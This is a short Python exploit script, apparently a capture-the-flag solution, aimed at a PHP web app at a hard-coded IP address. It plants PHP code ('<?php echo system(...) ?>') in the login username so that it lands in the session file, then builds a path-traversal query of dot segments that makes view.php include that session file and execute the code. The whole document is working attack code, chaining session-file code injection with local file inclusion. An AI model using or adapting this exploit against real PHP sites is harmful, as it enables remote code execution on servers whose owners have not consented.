from requests import get,post

url = "http://158.247.215.127:10002/"

login = {
    "username":"<?php echo system('/flag');?>"
}
cookie = post(url + "login.php",data=login).cookies.get_dict()
filename = f"./var/lib/php/sessions/sess_{cookie['PHPSESSID']}"
payload = "?"
for i in range(1,8):
    payload += f"filename[{i}]="
    if i%2==0:payload += "./"
    else:payload += "."
    payload += "&"
payload += f"filename[8]={filename}"
print(payload)
print(get(url + "view.php"+payload).text.split("\n")[1][:-2])